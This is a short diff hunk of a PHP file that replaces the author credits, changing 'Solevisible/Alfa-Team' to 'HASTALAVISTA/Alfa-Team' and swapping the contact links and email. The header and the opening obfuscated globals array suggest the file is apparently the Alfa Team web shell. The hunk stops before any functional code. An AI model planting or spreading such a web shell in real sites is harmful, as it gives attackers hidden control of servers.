@@ -1,10 +1,10 @@
 <?php
 
 /*
-	Author: 	Solevisible/Alfa-Team
-	Telegram: 	https://telegram.me/solevisible
-	YouTube: 	https://youtube.com/solevisible
-	Gmail:		solevisible@gmail.com
+	Author: 	HASTALAVISTA/Alfa-Team
+	Telegram: 	https://telegram.me/
+	YouTube: 	https://youtube.com/
+	Gmail:		tantegacor77@gmail.com
 	Date:		Monday, September 14, 2020
 */
 $GLOBALS['oZgNypoPRU'] = array(
